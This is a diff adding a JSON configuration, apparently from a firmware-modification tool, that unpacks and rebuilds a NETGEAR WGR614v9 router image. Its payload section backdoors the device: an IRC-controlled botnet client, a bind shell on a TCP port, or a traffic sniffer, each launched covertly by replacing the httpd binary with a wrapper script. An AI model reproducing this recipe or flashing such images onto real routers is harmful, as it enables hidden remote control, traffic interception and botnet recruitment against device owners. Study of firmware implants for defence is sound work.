@@ -1,0 +1,122 @@
+{
+  "Meta":{
+    "Targets":[
+      {
+        "Vendor":"NETGEAR",
+        "Model":"WGR614v9",
+        "Version":"1.2.30NA",
+        "Status":"Verified"
+      }
+    ],
+    "Authors":[
+      "Michael Coppola"
+    ],
+    "Date":"March 03, 2012",
+    "Size":1937466,
+    "NeedsRoot":false,
+    "Filename":"WGR614v9-V1.2.30_41.0.44NA.chk",
+    "Download":"ftp://downloads.netgear.com/files/WGR614v9-V1.2.30_41.0.44NA.chk",
+    "Checksum":"767c962037b32a5e800c3ff94a45e85e"
+  },
+  "OrderOfOperations":[
+    "ExtractParts",
+    "UnpackFS",
+    "_PAYLOAD_",
+    "BuildFS",
+    "PackImage",
+    "PadImage",
+    "GenerateCHK"
+  ],
+  "ExtractParts":{
+    "Description":"Extracting parts from firmware image",
+    "Steps":[
+      ["extract", "_FIRMWARE_IMG_", 58, 456708, "/headerkernel.bin"],
+      ["extract", "_FIRMWARE_IMG_", 456766, 1476831, "/filesystem.bin"]
+    ]
+  },
+  "UnpackFS":{
+    "Description":"Unpacking filesystem",
+    "Steps":[
+      ["unsquashfs-1.0", "/filesystem.bin", "/extracted_fs"]
+    ]
+  },
+  "BuildFS":{
+    "Description":"Building filesystem",
+    "Steps":[
+      ["mksquashfs-2.1", "/extracted_fs", 65536, "le", "/newfs.bin"]
+    ]
+  },
+  "PackImage":{
+    "Description":"Gluing parts together",
+    "Steps":[
+      ["touch", "_TARGET_IMG_"],
+      ["appendfile", "/headerkernel.bin", "_TARGET_IMG_"],
+      ["appendfile", "/newfs.bin", "_TARGET_IMG_"]
+    ]
+  },
+  "PadImage":{
+    "Description":"Padding image with null bytes",
+    "Steps":[
+      ["pad", "_TARGET_IMG_", 0, 1937408]
+    ]
+  },
+  "GenerateCHK":{
+    "Description":"Generating CHK header",
+    "Steps":[
+      ["packet", "_TARGET_IMG_", "dependencies/compatible_NA.txt", "dependencies/ambitCfg.h"]
+    ]
+  },
+  "Payloads":{
+    "botnet":{
+      "Description":"Remotely control device via IRC",
+      "Steps":[
+        ["rm", "/extracted_fs/lib/modules/2.4.20/kernel/net/ipv4/opendns/openDNS_hijack.o"],
+        ["cp", "payloads/botnet", "/extracted_fs/usr/sbin/botnet"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/botnet _IP_ _PORT_ \\_CHANNEL_ _PREFIX_ &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_IP_":"IP address of IRC server",
+        "_PORT_":"Port of IRC server",
+        "_CHANNEL_":"Channel to join (include #)",
+        "_PREFIX_":"Prefix of bot nick"
+      }
+    },
+    "bind":{
+      "Description":"Bind shell on TCP port",
+      "Steps":[
+        ["cp", "payloads/bind", "/extracted_fs/usr/sbin/bind"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/bind _PORT_ /bin/msh &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_PORT_":"Port to listen on"
+      }
+    },
+    "sniff":{
+      "Description":"Sniff traffic on the network",
+      "Steps":[
+        ["rm", "/extracted_fs/lib/modules/2.4.20/kernel/net/ipv4/opendns/openDNS_hijack.o"],
+        ["cp", "payloads/sniff", "/extracted_fs/usr/sbin/sniff"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/sniff _TARGET_ _LISTEN_ &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_TARGET_":"Sniff TCP traffic on port",
+        "_LISTEN_":"Port to listen on"
+      }
+    }
+  }
+}
